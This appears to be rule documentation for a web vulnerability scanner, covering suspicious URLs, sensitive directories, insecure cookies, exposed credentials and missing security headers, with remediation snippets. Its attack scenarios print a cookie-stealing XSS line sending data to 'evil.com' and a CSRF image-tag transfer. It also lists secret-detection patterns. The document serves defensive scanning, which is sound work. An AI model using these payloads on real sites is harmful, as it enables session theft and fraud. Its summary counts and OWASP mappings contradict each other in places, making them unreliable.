# Security Scanning Rules Documentation

This document describes all security rules used by the Agent Orchestrator for vulnerability detection and security analysis.

## Table of Contents
1. [Request Filtering Rules](#request-filtering-rules)
2. [Directory Discovery Rules](#directory-discovery-rules)
3. [Analysis Rules](#analysis-rules)
   - [Authentication & Session Management](#authentication--session-management)
   - [Sensitive Data Exposure](#sensitive-data-exposure)
   - [Security Misconfiguration](#security-misconfiguration)
   - [Cryptographic Failures](#cryptographic-failures)
   - [Information Disclosure](#information-disclosure)

---

## Request Filtering Rules

These rules determine which requests are flagged as suspicious during the thinking phase.

### RF-001: Sensitive URL Keywords
**Category:** Reconnaissance  
**OWASP Mapping:** A01:2025 - Broken Access Control  
**Severity:** MEDIUM  
**Description:** Detects URLs containing keywords that typically indicate sensitive functionality or administrative access.

**Keywords:**
- `login`, `signin`, `auth`, `authenticate`
- `admin`, `administrator`, `dashboard`, `console`
- `api`, `config`, `configuration`
- `user`, `users`, `account`, `profile`
- `session`, `token`

**Rationale:** Attackers often target authentication, administrative, and API endpoints as they provide high-value access to systems.

---

### RF-002: Suspicious HTTP Methods
**Category:** Reconnaissance  
**OWASP Mapping:** A01:2025 - Broken Access Control  
**Severity:** MEDIUM  
**Description:** Flags requests using HTTP methods that modify data or state.

**Methods:**
- `POST` - Create/modify operations
- `PUT` - Update operations
- `DELETE` - Deletion operations
- `PATCH` - Partial updates

**Rationale:** State-changing operations are more likely to contain security vulnerabilities such as CSRF, injection flaws, or access control issues.

---

### RF-003: Suspicious Status Codes
**Category:** Reconnaissance  
**OWASP Mapping:** A01:2025 - Broken Access Control, A05:2025 - Injection  
**Severity:** HIGH  
**Description:** Identifies HTTP responses with status codes indicating potential security issues.

**Status Codes:**
- `401 Unauthorized` - Missing or invalid authentication
- `403 Forbidden` - Potential authorization bypass opportunities
- `500 Internal Server Error` - May indicate injection vulnerabilities or unhandled errors

**Rationale:** These status codes often reveal security boundaries that can be tested for bypasses or exploitation.

---

### RF-004: Static Asset Exclusion
**Category:** Reconnaissance  
**Severity:** INFO  
**Description:** Excludes static assets from deep analysis to reduce noise.

**Extensions:**
- Styles: `.css`
- Scripts: `.js`
- Images: `.png`, `.jpg`, `.jpeg`, `.svg`, `.ico`
- Fonts: `.woff`, `.woff2`, `.ttf`, `.eot`

**Rationale:** Static assets rarely contain exploitable vulnerabilities and generate noise in security scans.

---

## Directory Discovery Rules

These rules identify suspicious directories that warrant recursive exploration.

### DD-001: Administrative Directories
**Category:** Discovery  
**OWASP Mapping:** A01:2025 - Broken Access Control  
**Severity:** HIGH  
**Description:** Identifies directories commonly used for administrative interfaces.

**Keywords:**
- `admin`, `administrator`
- `manage`, `management`
- `control`, `console`, `dashboard`
- `internal`, `private`
- `backend`, `backoffice`

**Rationale:** Administrative directories often lack proper access controls and contain high-value targets.

---

### DD-002: API Versioning Directories
**Category:** Discovery  
**OWASP Mapping:** A01:2025 - Broken Access Control  
**Severity:** MEDIUM  
**Description:** Detects versioned API endpoints that may have different security controls.

**Keywords:**
- `api`, `rest`, `graphql`
- `v1`, `v2`, `v3`, `v4`
- `version`

**Rationale:** Older API versions may contain unpatched vulnerabilities while newer versions are secured.

---

### DD-003: Configuration & Sensitive Folders
**Category:** Discovery  
**OWASP Mapping:** A02:2025 - Security Misconfiguration  
**Severity:** CRITICAL  
**Description:** Locates directories containing configuration files or sensitive data.

**Keywords:**
- `config`, `configuration`, `settings`
- `backup`, `old`, `.git`, `.svn`
- `secret`, `keys`, `credentials`
- `auth`, `session`

**Rationale:** Configuration directories may expose credentials, API keys, or other sensitive information.

---

## Analysis Rules

### Authentication & Session Management

#### AS-001: Bearer Token in Authorization Header
**Category:** Authentication  
**OWASP Mapping:** A07:2025 - Authentication Failures  
**Severity:** INFO  
**Description:** Detects Bearer tokens in request Authorization headers.

**Detection:**
- Header: `Authorization`
- Contains: `bearer` (case-insensitive)

**Rationale:** While not a vulnerability itself, documenting token usage helps track authentication mechanisms and identify token theft or replay attack opportunities.

---

#### AS-002: Insecure Cookie - Missing Secure Flag
**Category:** Session Management  
**OWASP Mapping:** A07:2025 - Authentication Failures, A04:2025 - Cryptographic Failures  
**Severity:** HIGH  
**CWE:** CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute  
**Description:** Identifies cookies set without the `Secure` attribute.

**Detection:**
- Header: `Set-Cookie`
- Missing: `Secure` attribute

**Impact:**
- Session cookies can be intercepted over unencrypted HTTP connections
- Man-in-the-Middle (MITM) attacks can steal session tokens
- Session hijacking becomes trivial on mixed HTTP/HTTPS sites

**Remediation:**
```http
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict
```

**References:**
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)

---

### Sensitive Data Exposure

#### SE-001: Sensitive Parameters in Query String
**Category:** Sensitive Data Exposure  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** HIGH  
**CWE:** CWE-598 - Use of GET Request Method With Sensitive Query Strings  
**Description:** Detects sensitive information passed in URL query parameters.

**Sensitive Parameters:**
- `token`, `access_token`, `api_key`, `apikey`
- `key`, `secret`, `secret_key`
- `password`, `passwd`, `pwd`
- `credentials`, `auth`

**Impact:**
- Query parameters are logged in browser history
- Logged on web servers and proxy servers
- Exposed in HTTP referrer headers
- Visible in browser URL bar (shoulder surfing)

**Remediation:**
- Use POST requests with encrypted payload
- Use temporary, single-use tokens
- Implement proper session management

**References:**
- [OWASP Transport Layer Protection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security)

---

#### SE-002: Credentials in Request Body
**Category:** Sensitive Data Exposure  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** WARNING  
**CWE:** CWE-319 - Cleartext Transmission of Sensitive Information  
**Description:** Identifies potential credentials in POST/PUT request bodies.

**Keywords in Body:**
- `password`, `passwd`, `pwd`
- `secret`, `api_secret`
- `credentials`, `creds`
- `private_key`, `privatekey`

**Impact:**
- If transmitted over HTTP, credentials are sent in cleartext
- Request bodies may be logged by web servers or middleware
- Debugging tools may expose credentials

**Remediation:**
- Always use HTTPS for authentication
- Implement proper password hashing client-side (not as sole protection)
- Use well-tested authentication libraries

---

#### SE-003: AWS Credentials in Response
**Category:** Sensitive Data Exposure  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** CRITICAL  
**CWE:** CWE-522 - Insufficiently Protected Credentials  
**Description:** Detects AWS access key IDs in HTTP responses.

**Detection Pattern:**
- AWS Access Key ID: Starts with `AKIA` (20 characters)
- AWS Secret Access Key: 40 characters (not detected by pattern, requires entropy analysis)

**Impact:**
- Full AWS account compromise
- Unauthorized access to S3 buckets, EC2 instances, databases
- Data exfiltration
- Cryptojacking and resource abuse
- Financial losses from unauthorized usage

**Remediation:**
- Never hardcode credentials in source code
- Use environment variables or secret management services (AWS Secrets Manager, HashiCorp Vault)
- Implement AWS IAM roles with least privilege
- Rotate credentials immediately if exposed
- Enable AWS CloudTrail for monitoring

**References:**
- [AWS Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning)

---

#### SE-004: JWT Token in Response Body
**Category:** Sensitive Data Exposure  
**OWASP Mapping:** A07:2025 - Authentication Failures  
**Severity:** INFO  
**Description:** Detects JSON Web Tokens (JWT) in response bodies.

**Detection Pattern:**
- Base64 string starting with `eyJ` (decoded: `{"`)

**Rationale:**
- JWTs should be analyzed for proper signing (HS256 vs RS256)
- Check for algorithm confusion vulnerabilities
- Verify token expiration claims

**Remediation:**
- Use `HttpOnly` cookies for JWT storage (prevents XSS theft)
- Implement short expiration times (15-30 minutes for access tokens)
- Use refresh token rotation
- Always verify signatures server-side

---

### Security Misconfiguration

#### SM-001: Server Information Disclosure
**Category:** Information Disclosure  
**OWASP Mapping:** A05:2025 - Security Misconfiguration  
**Severity:** INFO  
**CWE:** CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor  
**Description:** Detects servers revealing version information in response headers.

**Headers:**
- `Server` (e.g., `Apache/2.4.41`, `nginx/1.18.0`)
- `X-Powered-By` (e.g., `PHP/7.4.3`, `Express`)
- `X-AspNet-Version`
- `X-AspNetMvc-Version`

**Impact:**
- Version information helps attackers identify known vulnerabilities
- Facilitates automated vulnerability scanning
- Reduces reconnaissance time for attackers

**Remediation:**
```nginx
# Nginx
server_tokens off;

# Apache
ServerTokens Prod
ServerSignature Off

# PHP
expose_php = Off
```

**References:**
- [OWASP Testing for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server)

---

#### SM-002: Technology Stack Disclosure
**Category:** Information Disclosure  
**OWASP Mapping:** A05:2025 - Security Misconfiguration  
**Severity:** INFO  
**CWE:** CWE-200  
**Description:** Identifies `X-Powered-By` and similar headers revealing technology stack.

**Headers:**
- `X-Powered-By`
- `X-Runtime`
- `X-Version`
- `X-Framework`

**Impact:**
- Reveals application framework and version
- Assists in targeting framework-specific attacks
- Exposes potential RCE or known CVEs

**Remediation:**
- Remove or suppress technology disclosure headers
- Use reverse proxy to strip headers
- Configure application framework to minimize information disclosure

---

### Cryptographic Failures

#### CF-001: Missing HSTS Header
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** HIGH  
**CWE:** CWE-523 - Unprotected Transport of Credentials  
**Description:** HTTP Strict Transport Security (HSTS) header is missing from HTTPS responses.

**Detection:**
- Missing `Strict-Transport-Security` header in HTTPS responses

**Impact:**
- Users can be downgraded to HTTP (SSL Stripping attacks)
- Man-in-the-Middle attacks can intercept initial HTTP requests
- Session hijacking on first visit before HTTPS redirect
- Cookie theft over insecure connections

**Attack Scenario:**
1. User visits `http://example.com` (no HTTPS)
2. Attacker intercepts and blocks HTTPS redirect
3. User stays on HTTP connection
4. Attacker steals session cookies and credentials

**Remediation:**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Spring Boot:**
```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.headers()
            .httpStrictTransportSecurity()
            .maxAgeInSeconds(31536000)
            .includeSubDomains(true)
            .preload(true);
    }
}
```

**Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**References:**
- [OWASP HSTS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
- [hstspreload.org](https://hstspreload.org/)

---

#### CF-002: Missing Content Security Policy
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** MEDIUM  
**CWE:** CWE-693 - Protection Mechanism Failure  
**Description:** Content-Security-Policy header is missing.

**Detection:**
- Missing `Content-Security-Policy` header

**Impact:**
- No protection against XSS attacks
- Allows loading of malicious scripts from any source
- No control over resource origins
- Data exfiltration via malicious scripts
- Vulnerable to code injection attacks

**Remediation:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
```

**Strict CSP (Recommended):**
```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; base-uri 'self'; form-action 'self';
```

**Express.js:**
```javascript
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'", "data:", "https:"]
  }
}));
```

**References:**
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

#### CF-003: Missing X-Content-Type-Options
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** MEDIUM  
**CWE:** CWE-693 - Protection Mechanism Failure  
**Description:** X-Content-Type-Options header is missing.

**Detection:**
- Missing `X-Content-Type-Options` header

**Impact:**
- Browser may MIME-sniff responses
- Can interpret uploaded files as HTML/JavaScript
- Enables XSS via uploaded content
- File upload vulnerabilities become more severe

**Attack Scenario:**
1. Attacker uploads `malicious.jpg` (actually contains JavaScript)
2. Without `nosniff`, browser may execute it as script
3. XSS achieved via file upload

**Remediation:**
```http
X-Content-Type-Options: nosniff
```

**All Frameworks:**
Always add this header - no configuration needed, just set it.

**References:**
- [MDN X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)

---

#### CF-004: Missing X-Frame-Options
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** MEDIUM  
**CWE:** CWE-1021 - Improper Restriction of Rendered UI Layers  
**Description:** X-Frame-Options header is missing.

**Detection:**
- Missing `X-Frame-Options` header

**Impact:**
- Site can be embedded in `<iframe>` by attackers
- Vulnerable to clickjacking attacks
- UI redressing attacks
- Users may unknowingly perform actions

**Attack Scenario:**
1. Attacker creates malicious page with invisible iframe
2. Iframe loads victim site (e.g., bank transfer page)
3. User thinks they're clicking attacker's button
4. Actually clicking "Confirm Transfer" in hidden iframe

**Remediation:**
```http
X-Frame-Options: DENY
# or
X-Frame-Options: SAMEORIGIN
```

**When to use:**
- `DENY` - Site should never be framed
- `SAMEORIGIN` - Allow framing by same origin only

**Modern Alternative (CSP):**
```http
Content-Security-Policy: frame-ancestors 'none';
# or
Content-Security-Policy: frame-ancestors 'self';
```

**References:**
- [OWASP Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

#### CF-005: Cookie Missing HttpOnly Flag
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** HIGH  
**CWE:** CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag  
**Description:** Cookie set without HttpOnly flag.

**Detection:**
- `Set-Cookie` header exists
- Missing `HttpOnly` attribute

**Impact:**
- Session cookies can be read by JavaScript
- XSS attacks can steal session tokens
- Account takeover via cookie theft
- Persistent access even after XSS is fixed

**Attack Scenario:**
1. XSS vulnerability exists on site
2. Attacker injects: `<script>fetch('evil.com?c='+document.cookie)</script>`
3. Session cookie stolen
4. Attacker uses stolen cookie to impersonate user

**Remediation:**
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

**PHP:**
```php
setcookie('sessionid', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

**Express.js:**
```javascript
res.cookie('sessionid', value, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

**Django:**
```python
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Strict'
```

**References:**
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

#### CF-006: Cookie Missing SameSite Attribute
**Category:** Cryptographic Failures  
**OWASP Mapping:** A04:2025 - Cryptographic Failures  
**Severity:** MEDIUM  
**CWE:** CWE-352 - Cross-Site Request Forgery  
**Description:** Cookie set without SameSite attribute.

**Detection:**
- `Set-Cookie` header exists
- Missing `SameSite` attribute

**Impact:**
- Vulnerable to Cross-Site Request Forgery (CSRF)
- Cookies sent with cross-origin requests
- State-changing operations can be triggered
- Session riding attacks

**Attack Scenario:**
1. User logged into `bank.com`
2. User visits `evil.com`
3. Evil site triggers: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`
4. Browser sends cookies to bank.com
5. Transfer executes without user consent

**Remediation:**
```http
Set-Cookie: sessionid=abc123; SameSite=Strict
# or for more compatibility
Set-Cookie: sessionid=abc123; SameSite=Lax
```

**When to use:**
- `Strict` - Cookie never sent cross-origin (most secure)
- `Lax` - Cookie sent on top-level navigation (balance security/UX)
- `None; Secure` - Only if you need cross-site cookies (e.g., OAuth)

**Combined Best Practice:**
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

**References:**
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

---

## Summary Table: Cryptographic Failures

| Rule | Severity | CWE | Primary Risk | Fix Complexity |
|------|----------|-----|--------------|----------------|
| CF-001 | HIGH | CWE-523 | SSL Stripping, MITM | Low |
| CF-002 | MEDIUM | CWE-693 | XSS, Code Injection | Medium |
| CF-003 | MEDIUM | CWE-693 | MIME Sniffing XSS | Low |
| CF-004 | MEDIUM | CWE-1021 | Clickjacking | Low |
| CF-005 | HIGH | CWE-1004 | Session Theft via XSS | Low |
| CF-006 | MEDIUM | CWE-352 | CSRF Attacks | Low |

**Priority Order:**
1. **CF-001** (HSTS) + **CF-005** (HttpOnly) - Prevent session theft
2. **CF-006** (SameSite) - Prevent CSRF
3. **CF-002** (CSP) - Defense in depth for XSS
4. **CF-003** (nosniff) + **CF-004** (X-Frame-Options) - Additional hardening

**Complete Security Headers Example:**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Set-Cookie: sessionid=xyz; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

---

### Information Disclosure

#### ID-001: Directory Listing Enabled
**Category:** Information Disclosure  
**OWASP Mapping:** A05:2025 - Security Misconfiguration  
**Severity:** MEDIUM  
**CWE:** CWE-548 - Information Exposure Through Directory Listing  
**Description:** Web server returns directory listings instead of default index pages.

**Impact:**
- Exposes file structure
- Reveals backup files, configuration files
- Assists in reconnaissance

**Remediation:**
```apache
# Apache
Options -Indexes

# Nginx
autoindex off;
```

---

#### ID-002: Error Messages with Stack Traces
**Category:** Information Disclosure  
**OWASP Mapping:** A10:2025 - Mishandling of Exceptional Conditions  
**Severity:** MEDIUM  
**CWE:** CWE-209 - Generation of Error Message Containing Sensitive Information  
**Description:** Application returns detailed error messages with stack traces to users.

**Impact:**
- Reveals application framework and version
- Exposes file paths and directory structure
- Discloses database schema information
- Provides information for SQL injection or code execution

**Remediation:**
- Implement custom error pages
- Log detailed errors server-side only
- Return generic error messages to users

---

## Rule Categories Summary

| Category | Rule Count | Severity Distribution |
|----------|------------|----------------------|
| Request Filtering | 4 | HIGH: 1, MEDIUM: 2, INFO: 1 |
| Directory Discovery | 3 | CRITICAL: 1, HIGH: 1, MEDIUM: 1 |
| Authentication & Session | 2 | HIGH: 1, INFO: 1 |
| Sensitive Data Exposure | 4 | CRITICAL: 1, HIGH: 1, WARNING: 1, INFO: 1 |
| Security Misconfiguration | 2 | INFO: 2 |
| Cryptographic Failures | 2 | CRITICAL: 1, HIGH: 1 |
| Information Disclosure | 2 | MEDIUM: 2 |

---

## Severity Levels

- **CRITICAL**: Immediate data breach or system compromise risk
- **HIGH**: Significant security impact, should be fixed urgently
- **MEDIUM**: Moderate security risk, should be addressed
- **WARNING**: Potential security issue, needs verification
- **INFO**: Informational finding, helps understand application behavior

---

## Integration with OWASP Top 10 (2025)

This ruleset maps to the following OWASP Top 10 categories:

1. **A01:2025 - Broken Access Control**: RF-001, RF-002, RF-003, DD-001, DD-002
2. **A02:2025 - Security Misconfiguration**: DD-003, SM-001, SM-002, ID-001
3. **A04:2025 - Cryptographic Failures**: AS-002, SE-001, SE-002, SE-003, CF-001, CF-002
4. **A05:2025 - Injection**: RF-003
5. **A07:2025 - Authentication Failures**: AS-001, AS-002, SE-004
6. **A10:2025 - Mishandling of Exceptional Conditions**: ID-002

---

## Version History

- **v1.0.0** (2026-02-07): Initial rule documentation with OWASP Top 10 2025 mapping
